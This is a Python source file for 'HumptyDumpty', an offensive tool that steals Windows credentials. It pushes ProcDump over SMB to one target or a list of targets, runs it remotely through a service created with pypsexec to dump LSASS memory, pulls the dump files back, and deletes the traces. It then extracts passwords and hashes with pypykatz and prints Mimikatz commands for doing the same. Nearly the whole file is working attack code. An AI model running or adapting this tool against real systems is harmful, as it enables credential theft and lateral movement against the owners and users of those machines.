#!/usr/bin/env python3
# Author: David Roccasalva (n33dle)
# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz. Not my idea, found this technique is quite popular, decided to make my own python tool
# WORK IN PROGRESS!
# Note: This code may suck. Or, it may be you that sucks.
#
# v0.1 - WIP release
# v0.2 - Added automated credential dumping with pypykatz (Checkout @skelec awesome project here: https://github.com/skelsec/pypykatz - Thanks!)

#libs
import subprocess
import argparse
from termcolor import colored
from pypsexec.client import Client

#set arugments
parser = argparse.ArgumentParser(description="Dump lsass on remote machines for local processing!",
    add_help=True,
    epilog="EXAMPLES:python3 humptydumpty.py -t 192.168.13.37 -u admin -p @dm1n")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("--target", "-t", help="Set the target", dest="target")
group.add_argument("--file", "-f", type=argparse.FileType('r'), help="Load ips/hostnames from file")
parser.add_argument("--username", "-u", help="Set the target username", dest="username", required=True)
parser.add_argument("--password", "-p", help="Set the target password", dest="password", required=True)
parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default=".")
parser.add_argument("--output", "-o", help="Destination directory, default is current dir. Example: /dest/dir/", dest="output", default="")
parser.add_argument("--dont-dump", "-D", help="Will not perform automated credential dumping of dumpfiles", dest="dontdump", action="store_true")
parser.add_argument("--version", action="version", version="0.2")
args = parser.parse_args()

### START ###
print (colored("\nHumptyDumpty by }==[n33dle]>----", "white"))

print (colored("\n[Obtaining dumpfiles]", "magenta"))
if args.file is None:
############ THIS SECTION IS TO PERFORM ALL ACTIONS ON A SINGLE TARGET ############
    #upload procdump
    print (colored("[-] Sending ProcDump over SMB...", "yellow"))
    subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"], stderr=subprocess.DEVNULL)
    print (colored("[+] Done", "green"))

    #Dump creds
    print (colored("[-] Dumping lsass to file (executing procdump)...", "yellow"))
    #hate this, want to do without if statement
    if args.domain is ".":
        c = Client(args.target, username=args.username, password=args.password, encrypt=False)
    else:
        c = Client(args.target, username=args.username+"@"+args.domain, password=args.password, encrypt=False)
    c.connect()
    try:
        c.create_service()
        c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + args.target + ".dmp")
    finally:
        #to do: cleanup/remove service before disconnect
        c.disconnect()
    print (colored("[+] Done", "green"))

    #Download dump and cleanup
    print (colored("[-] Downloading the lsass dumpfile and cleaning up...", "yellow"))
    subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c get humpty-"+args.target+".dmp "+args.output+"humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"], stderr=subprocess.DEVNULL)
    print (colored("[+] Done - saved as: "+args.output+"humpty-"+args.target+".dmp", "green"))

else:
############ THIS SECTION IS TO PERFORM ALL ACTIONS WHEN LOADING TARGETS FROM FILE ############
    for ip in args.file.read().splitlines():
        try:
            #upload procdump
            print (colored("\n["+ip+"]", "red"))
            print (colored("\n[-] Sending ProcDump over SMB to "+ip+"...", "yellow"))
            subprocess.call(["smbclient","//"+ip+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"], stderr=subprocess.DEVNULL)
            print (colored("[+] Done", "green"))

            #Dump creds
            print (colored("[-] Dumping lsass to file (executing procdump)...", "yellow"))
            #hate this, want to do without if statement
            if args.domain is ".":
                c = Client(ip, username=args.username, password=args.password, encrypt=False)
            else:
                c = Client(ip, username=args.username+"@"+args.domain, password=args.password, encrypt=False)
            c.connect()
            try:
                c.create_service()
                c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + ip + ".dmp")
            finally:
                #to do: cleanup/remove service before disconnect
                c.disconnect()
            print (colored("[+] Done", "green"))

            #Download dump and cleanup
            print (colored("[-] Downloading the lsass dumpfile and cleaning up...", "yellow"))
            subprocess.call(["smbclient","//"+ip+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c get humpty-"+ip+".dmp "+args.output+"humpty-"+ip+".dmp;del humpty-"+ip+".dmp;del procdump.exe"], stderr=subprocess.DEVNULL)
            print (colored("[+] Done - saved as: "+args.output+"humpty-"+ip+".dmp", "green"))
            pass

        except:
            print ("could not read")

############ THIS SECTION IS TO PERFORM CREDS DUMPING WITH PYPYKATZ ############
print (colored("[Dumping creds]", "magenta"))

if args.dontdump is not True:
    #automated dumping:
    print (colored("[-] Dumping creds from lsass dumpfiles...", "yellow"))
    if args.file is None:
        subprocess.call(["pypykatz","lsa","minidump","humpty-"+args.target+".dmp","-o","credentials.txt"], stderr=subprocess.DEVNULL)
    else:
        #WORK IN PROGRESS - START
        print (colored("[-] NOT IMPLEMENTED YET", "yellow"))
        print (colored("[-] For multiple dumpfiles, please dump manually with:", "yellow"))
        print (colored("[-] pypykatz lsa minidump humtpy-<dumpfile>.dmp> -o credentials.txt", "blue"))
        #subprocess.call("pypykatz lsa minidump humpty-*.dmp -o credentials.txt", shell=True)
        #WORK IN PROGRESS - FINISH
    print (colored("[+] All completed, review credentials.txt", "green"))
else:
    #message on how to dump stuff manually:
    print (colored("[+] Now dump those creds\nRun the following:", "green"))
    print (colored("\npypykatz:\n$pypykatz lsa minidump humtpy-<dumpfile>.dmp> ", "blue"))
    print (colored("\nOr, with Mimikatz:\nMimikatz# sekurlsa::Minidump humpty-<dumpfile>.dmp", "blue"))
    print (colored("Mimikatz# sekurlsa::logonPasswords full\n", "blue"))
